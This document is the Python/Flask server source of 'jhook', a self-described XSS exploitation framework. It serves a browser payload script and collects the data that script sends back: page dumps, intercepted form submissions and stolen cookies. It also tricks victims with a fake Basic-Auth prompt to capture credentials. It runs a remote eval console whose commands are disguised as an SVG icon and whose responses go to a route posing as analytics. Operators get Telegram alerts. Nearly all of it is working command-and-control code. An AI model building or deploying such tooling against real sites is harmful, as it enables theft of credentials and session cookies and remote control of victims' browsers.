from flask import Flask, render_template, request, make_response, redirect, send_from_directory, session, flash, url_for, abort
from .models import *
import bcrypt, json
from uuid import uuid1
from base64 import b64decode, b64encode
from datetime import datetime
from .utils import *
from os import path, mkdir, urandom, getcwd
from random import randint
from functools import wraps
from threading import Thread
from .telegram import botProcess
import sys, argparse, logging
from multiprocessing import Queue
from time import time
from gevent.pywsgi import WSGIServer

app = Flask(__name__)

messageQueue = Queue()

class evalShell:
    def __init__(self):
        self.logs = []
        self.cmds = Queue()
        self.lastSeen = int(time())
    
    def getCmd(self):
        if not self.cmds.empty():
            cmd = self.cmds.get()
            return cmd
        else:
            return ""
    
    def sendCmd(self, cmd):
        self.cmds.put(cmd)
    
    def addLog(self, l):
        self.logs.append(l)
    

evalConsoles = {}

app.secret_key = urandom(32)

HTTP_METHODS = ["GET", "HEAD", "POST", "PUT", "DELETE", "CONNECT", "OPTIONS", "TRACE", "PATCH", "COPY", "UNLINK"]

def getContentDir():
    contentDir = path.join(getcwd(), "content")
    if not path.isdir(contentDir):
        mkdir(contentDir)
    return contentDir

app.config["SQLALCHEMY_DATABASE_URI"] = "sqlite:///{}".format(path.join(getcwd(), 'data.db'))

db.init_app(app)

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if "auth" not in session or session["auth"] != True:
            return redirect(url_for("login"))
        return f(*args, **kwargs)
    return decorated_function

with app.app_context():
    db.create_all()
    users = User.query.all()
    if len(users) == 0:
        db.session.add (User(password=bcrypt.hashpw("admin".encode("utf-8"), bcrypt.gensalt())))
        db.session.commit()
        db.session.close()

@app.route("/", methods=["GET"])
def index_redirect():
    return redirect(url_for("login"))

@app.route("/login", methods=["GET", "POST"])
def login():
    if (request.method == "GET"):
        return render_template("login.html")
    else:
        storedUser = User.query.first()
        if (bcrypt.checkpw(request.form["password"].encode("utf-8"), storedUser.password)):
            session["auth"] = True
            return redirect(url_for("hooks"))
        else:
            flash("Wrong password", "err")
            return render_template("login.html")

@app.route("/<int:xid>", methods=HTTP_METHODS)
def hook_recv(xid):
    if request.method == "OPTIONS":
        response = make_response()
        response.headers.add("Access-Control-Allow-Origin", "*")
        response.headers.add('Access-Control-Allow-Headers', "*")
        response.headers.add('Access-Control-Allow-Methods', "*")
        return response
    else:
        hook = Hooks.query.filter_by(xid=xid).first()
        if (hook is None):
            return "not found", 404
        else:
            for e in HooksNotifiers.query.filter_by(hookID=hook.id).all():
                user = TelegramUsers.query.filter_by(id=e.userID).first()
                messageQueue.put({ 
                    "chat": user.chatID,
                    "text": "Hook {} received a {} request from {}".format(hook.name, request.method.upper(), request.remote_addr)
                })
            data = parseJson(request.data)
            isJSON = data is not None
            filename =  str(uuid1()).replace("-", "")
            if (isJSON and "type" in data):
                t = data["type"]
                if (t == 1):
                    filename += ".html"
                elif (t == 2):
                    filename += ".json"
                elif (t == 3):
                    filename += ".png"
                elif (t == 4):
                    filename += ".js"
                elif (t == 5 or t == 6 or t == 7):
                    filename += ".txt"
                else:
                    filename += ".bin"
            out = path.join(getContentDir(), filename)
            if (isJSON and "type" in data and "title" in data and "content" in data):
                with open(out, "wb") as fl:
                    fl.write(b64decode(data["content"]))
            else:
                with open(out, "wb") as fl:
                    fl.write(request.data)
            queryString = ""
            for arg in request.args:
                queryString += "{}: {}\n".format(arg, request.args[arg])
            resp = Requests(
                hookID = hook.id,
                date = datetime.now(),
                url = request.base_url,
                headers = str(request.headers),
                content = filename,
                contentType = int(data["type"]) if isJSON and "type" in data else 0,
                title =  data["title"] if isJSON and "title" in data else "unknown",
                method = request.method,
                queryString = queryString
            )
            db.session.add(resp)
            db.session.commit()
            db.session.close()
            response = make_response("ok")
            response.headers.add("Access-Control-Allow-Origin", "*")
            return response

@app.route("/<int:xid>/lib.js", methods=["GET", "OPTIONS"])
def lib(xid):
    element = Hooks.query.filter_by(xid=xid).first()
    if element is None:
        return abort(404)
    if request.method == "OPTIONS":
        response = make_response()
        response.headers.add("Access-Control-Allow-Origin", "*")
        response.headers.add('Access-Control-Allow-Headers', "*")
        response.headers.add('Access-Control-Allow-Methods', "*")
        return response
    else:
        for e in HooksNotifiers.query.filter_by(hookID=element.id).all():
            user = TelegramUsers.query.filter_by(id=e.userID).first()
            messageQueue.put({ 
                "chat": user.chatID,
                "text": "{} loaded the payload for the hook {}".format(request.remote_addr, element.name)
            })
        toScrape = [ u.url for u in UrlsToScrape.query.filter_by(hookID=element.id).all()]
        response = make_response(
            render_template("script.js", 
                hook = element, 
                toScrape = toScrape,
                toScrape_len = len(toScrape) + 1 if element.scrape else 0,
                home = request.url_root[:-1] + url_for("hook_recv", xid=xid),
                cc_len = len(element.customCode)
            )
        )
        response.headers.add("Content-Type", "application/javascript")
        response.headers.add("Access-Control-Allow-Origin", "*")
        return response

@app.route("/assets/<int:xid>/<name>/icon.svg", methods=["GET", "OPTIONS"])
def cmd(xid, name):
    name = b64decode(name.encode("utf-8")).decode("utf-8")
    element = Hooks.query.filter_by(xid=xid).first()
    if element is None:
        return abort(404)
    if request.method == "OPTIONS":
        response = make_response()
        response.headers.add("Access-Control-Allow-Origin", "*")
        response.headers.add('Access-Control-Allow-Headers', "*")
        response.headers.add('Access-Control-Allow-Methods', "*")
        return response
    else:
        if element.xid not in evalConsoles:
            evalConsoles[element.xid] = {}
        if name not in evalConsoles[element.xid]: 
            evalConsoles[element.xid][name] = evalShell()
         
        response = make_response(render_template("transport.svg", cmd=b64encode(evalConsoles[element.xid][name].getCmd().encode("utf-8")).decode("utf-8")))
        response.headers.add("Access-Control-Allow-Origin", "*")
        response.headers.add("Content-Type", "image/svg+xml")
        return response

@app.route("/analytics/events/<int:xid>/<name>", methods=["POST", "OPTIONS"])
def save_cmd_response(xid, name):
    name = b64decode(name.encode("utf-8")).decode("utf-8")
    element = Hooks.query.filter_by(xid=xid).first()
    if element is None:
        return abort(404)
    if request.method == "OPTIONS":
        response = make_response()
        response.headers.add("Access-Control-Allow-Origin", "*")
        response.headers.add('Access-Control-Allow-Headers', "*")
        response.headers.add('Access-Control-Allow-Methods', "*")
        return response
    else:
        if element.xid in evalConsoles and name in evalConsoles[element.xid]:
            evalConsoles[element.xid][name].addLog("Response: {}".format(b64decode(request.data.decode("utf-8")).decode("utf-8")))
            response = make_response("ok")
            response.headers.add("Access-Control-Allow-Origin", "*")
            return response
        else:
            abort(404)

@app.route("/eval-logs/<int:xid>/<name>", methods=["GET"])
@login_required
def get_logs(xid, name):
    sxid = str(xid)
    if sxid in evalConsoles and name in evalConsoles[sxid]:
        return evalConsoles[sxid][name].logs, 200
    else:
        abort(404)

@app.route("/send-eval/<int:xid>/<name>", methods=["POST"])
@login_required
def send_eval(xid, name):
    sxid = str(xid)
    if sxid in evalConsoles and name in evalConsoles[sxid]:
        cmd = request.data.decode("utf-8")
        evalConsoles[sxid][name].addLog("Submitted: {}".format(cmd))
        evalConsoles[sxid][name].sendCmd(cmd)
        return "ok"
    else:
        abort(404)

@app.route("/hooks", methods=["GET"])
@login_required
def hooks():
    return render_template("hooks.html", hooks=Hooks.query.all())

@app.route("/new-hook", methods=["GET", "POST"])
@login_required
def new_hook():
    if (request.method == "GET"):
        return render_template("new-hook.html", telegram_users=TelegramUsers.query.filter_by(approved=True).all())
    else:
        hook = Hooks(
            name = request.form["name"],
            xid = str(randint(0, 99999999999)),
            customCode = request.form["customCode"],
            interceptSubmittedForms = "interceptSubmittedForms" in request.form,
            linksPersistence = "linksPersistence" in request.form,
            evalConsole = "evalConsole" in request.form,
            fakeBasicAuth ="fake-auth" in request.form,
            stealCookie = "stealCookie" in request.form,
            scrape = "scrape" in request.form,
        )
        db.session.add(hook)
        db.session.commit()
        urls =  parseJson(request.form["toScrape"], default=[], decode=False) if "toScrape" in request.form else []
        for url in urls:
            db.session.add(UrlsToScrape(url=url, hookID=hook.id))
        toNotify =  parseJson(request.form["toNotify"], default=[], decode=False) if "toNotify" in request.form else []
        for id_x in toNotify:
            db.session.add(HooksNotifiers(userID=id_x, hookID=hook.id))
        db.session.commit()
        db.session.close()
        return redirect(url_for('hooks'))

@app.route("/hooks/<int:id>", methods=["GET"])
@login_required
def hook(id):
    element = db.get_or_404(Hooks, id)
    reqs = Requests.query.filter_by(hookID=element.id).all()
    return render_template("view-hook.html", 
        hook = element, 
        reqs = reqs, 
        types = ["Unknown", "Page-Dump", "JSON", "Image", "JS", "Form Data", "Fake Basic-Auth", "Cookies"],
        reqs_len = len(reqs),
        consoles = [e for e in (evalConsoles[element.xid] if element.xid in evalConsoles else {}) ]
    )
    
@app.route("/edit-hook/<int:id>", methods=["GET", "POST"])
@login_required
def edit_hook(id):
    element = db.get_or_404(Hooks, id)
    if (request.method == "POST"):
        element.name=request.form["name"]
        element.customCode=request.form["customCode"]
        element.interceptSubmittedForms= "interceptSubmittedForms" in request.form
        element.linksPersistence= "linksPersistence" in request.form
        element.evalConsole= "evalConsole" in request.form
        element.fakeBasicAuth= "fakeBasicAuth" in request.form
        element.stealCookie = "stealCookie" in request.form
        element.scrape = "scrape" in request.form
        urls =  parseJson(request.form["toScrape"], default=[], decode=False) if "toScrape" in request.form else []
        UrlsToScrape.query.filter_by(hookID=element.id).delete()
        for url in urls:
            db.session.add(UrlsToScrape(url=url, hookID=element.id))
        toNotify =  parseJson(request.form["toNotify"], default=[], decode=False) if "toNotify" in request.form else []
        HooksNotifiers.query.filter_by(hookID=element.id).delete()
        for id_x in toNotify:
            db.session.add(HooksNotifiers(userID=id_x, hookID=element.id))
        db.session.commit()
        return redirect(url_for("hook", id=element.id))
    else:
        return render_template("edit-hook.html", 
            hook = element,
            urls = [ u.url for u in UrlsToScrape.query.filter_by(hookID=element.id).all()],
            telegram_users = TelegramUsers.query.filter_by(approved=True).all(),
            telegram_notifiers = [ { "id": e.user.id, "u": e.user.name } for e in HooksNotifiers.query.filter_by(hookID=element.id).all()]
        )

@app.route("/hooks/<int:id>", methods=["DELETE"])
@login_required
def hooks_delete(id):
    element = db.get_or_404(Hooks, id)
    UrlsToScrape.query.filter_by(hookID=element.id).delete()
    HooksNotifiers.query.filter_by(hookID=element.id).delete()
    Requests.query.filter_by(hookID=element.id).delete()
    db.session.delete(element)
    db.session.commit()
    db.session.close()
    return {}, 200

@app.route("/logout", methods=["GET"])
def logout():
    session["auth"] = False
    return redirect(url_for("login"))

@app.route("/change-password", methods=["GET", "POST"])
@login_required
def change_password():  
    if (request.method == "GET"):
        return render_template("change-password.html")
    else:
        storedUser = User.query.first()
        if (bcrypt.checkpw(request.form["old_password"].encode("utf-8"), storedUser.password)):
            if (request.form["new_password"] != request.form["repeat"]):
                flash("The passwords do not match", "err")
                return render_template("change-password.html")
            elif len(request.form["new_password"]) < 8:
                flash("Password too short (min 8 chars)", "err")
                return render_template("change-password.html")
            else:
                storedUser.password = bcrypt.hashpw(request.form["new_password"].encode("utf-8"), bcrypt.gensalt())
                db.session.add(storedUser)
                db.session.commit()
                db.session.close()
                flash("Password changed", "success")
                return render_template("change-password.html")
        else:
            flash("Wrong password", "err")
            return render_template("change-password.html")
 

@app.route("/telegram-notifications/current", methods=["GET"])
@login_required
def telegram_notifications_current():  
    return render_template("notifications.html", users=TelegramUsers.query.filter_by(approved=True).all(), selected="current") 

@app.route("/telegram-notifications/pending", methods=["GET"])
@login_required
def telegram_notifications_pending():  
    return render_template("notifications.html", users=TelegramUsers.query.filter_by(approved=None).all(), selected="pending")

@app.route("/telegram-notifications/blocked", methods=["GET"])
@login_required
def telegram_notifications_blocked():  
    return render_template("notifications.html", users=TelegramUsers.query.filter_by(approved=False).all(), selected="blocked") 

@app.route("/telegram-users/<int:id>", methods=["DELETE"])
@login_required
def delete_telegram_user(id):
    element = db.get_or_404(TelegramUsers, id)
    db.session.delete(element)
    db.session.commit()
    db.session.close()
    return {}, 200

@app.route("/bot-requests/approve", methods=["POST"])
@login_required
def bot_requests_approve():
    element = db.get_or_404(TelegramUsers, request.json["id"])
    element.approved =  request.json["approved"]
    db.session.commit()
    db.session.close()
    return {}, 200

@app.route("/ba/<int:xid>", methods=["GET"])
def fake_basic_auth(xid):
    hook = Hooks.query.filter_by(xid=xid).first()
    if (hook is None):
        return abort(404)
    basic = request.headers.get("Authorization", None)
    if (basic is not None):
        auth = b64decode(basic.split(" ")[1])
        user, psw = auth.decode("utf-8").split(":")
        queryString = ""
        for arg in request.args:
            queryString += "{}: {}\n".format(arg, request.args[arg])
        filename =  str(uuid1()).replace("-", "") + ".txt"
        out = path.join(getContentDir(), filename)
        for e in HooksNotifiers.query.filter_by(hookID=hook.id).all():
            u = TelegramUsers.query.filter_by(id=e.userID).first()
            messageQueue.put({ 
                "chat": u.chatID,
                "text": "Hook {} received fake Basic-Auth credentials from {}".format(hook.name, request.remote_addr)
            })
        with open(out, "w") as fl:
            fl.write("User: {} Password: {}".format(user, psw))
        resp = Requests(
                hookID = hook.id,
                date = datetime.now(),
                url = request.base_url,
                headers = str(request.headers),
                content = filename,
                contentType = 6,
                title =  "Fake basic-auth credentials",
                method = request.method,
                queryString = queryString
        )
        
        db.session.add(resp)
        db.session.commit()
        return ""
    else:
        response = make_response()
        response.headers.add("WWW-Authenticate", "Basic realm=\"ba\"")
        return response, 401

@app.route("/get-content/<id>", methods=["GET"])
@login_required
def get_content(id,f=None):
    return send_from_directory(getContentDir(), id)

def main():
    print("""\033[94m
   _ _                 _    
  (_) |__   ___   ___ | | __
  | | '_ \\ / _ \\ / _ \\| |/ /
  | | | | | (_) | (_) |   < 
 _/ |_| |_|\\___/ \\___/|_|\_\\
|__/                                                                                                          
    \033[0m""")
    parser = argparse.ArgumentParser(
        prog="jhook",
        description="XSS exploitation framework"
    )
    parser.add_argument("-db", "--database")
    parser.add_argument("-p", "--port", type=int, default=5000)
    parser.add_argument("-telegram-token", "--telegram-token", type=str)
    parser.add_argument('-debug', '--debug', nargs='?', default=argparse.SUPPRESS)

    args = parser.parse_args()

    if args.database is not None:
        app.config["SQLALCHEMY_DATABASE_URI"] = "sqlite:///{}".format(args.database)

    bot = Thread(target=botProcess, args=(app, messageQueue, args.telegram_token), daemon=True)
    try:
        bot.start()
        print("[*] Starting web server on port {}".format(args.port))
        print("[!] The default password for the first login is 'admin' (it's recommended to change it after the first login)")
        if 'debug' in args:
            http_server = WSGIServer(("", args.port), app) 
        else:
            http_server = WSGIServer(("", args.port), app, log=None) 
        http_server.serve_forever()
    except:
        http_server.stop()
        sys.exit("App killed")